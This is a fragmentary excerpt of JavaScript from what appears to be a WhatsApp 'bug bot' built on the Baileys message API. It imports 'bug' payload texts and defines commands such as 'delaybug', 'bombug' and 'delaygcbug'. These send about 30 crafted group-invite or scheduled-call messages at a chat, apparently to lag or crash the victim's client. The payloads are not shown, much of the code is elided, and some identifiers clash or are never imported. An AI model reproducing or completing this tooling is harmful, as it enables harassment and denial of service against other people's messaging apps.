...
//bug database
const { Wallyjaytechtext1 } = require("./src/data/function/WJTBug/Wallyjaytechtext1.js");
const { wallyjaytechtext2 } = require("./src/data/function/WJTBug/Wallyjaytechtext2.js");
const { wallyjaytechtext3 } = require("./src/data/function/WJTBug/Wallyjaytechtext3.js");
const { wallyjaytechtext4 } = require("./src/data/function/WJTBug/Wallyjaytechtext4.js");
    ...
    const fbug2 = {
      ...
      message: {
        groupInviteMessage: {
          ...
          inviteCode: "m",
          groupName: `${wallyjaytechtext1}`,
          caption: `${wallyjaytechtext1}`,
          jpegThumbnail: thumb,
        },
      },
    };
      ...
      case "amountbug":
        {
          ...
          for (let i = 0; i < amount; i++) {
            const Wallyjaytech = `${wallyjaytechtext1}`;
      ...
      case "delaybug":
        {
          ...
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const Wallyjaytech = wallyjaytechtext2;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
      ...
      case "unlimitedbug":
        {
          ...
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const Wallyjaytech = wallyjaytechtext3;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
      ...
      case "bombug":
        {
          ...
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const Wallyjaytech = wallyjaytechtext4;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
      ...
      case "delaygcbug":
        {
          ...
          amount = "30";
          for (let i = 0; i < amount; i++) {
            const Wallyjaytech = wallyjaytechtext5;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
              from,
              proto.Message.fromObject({
                scheduledCallCreationMessage: {
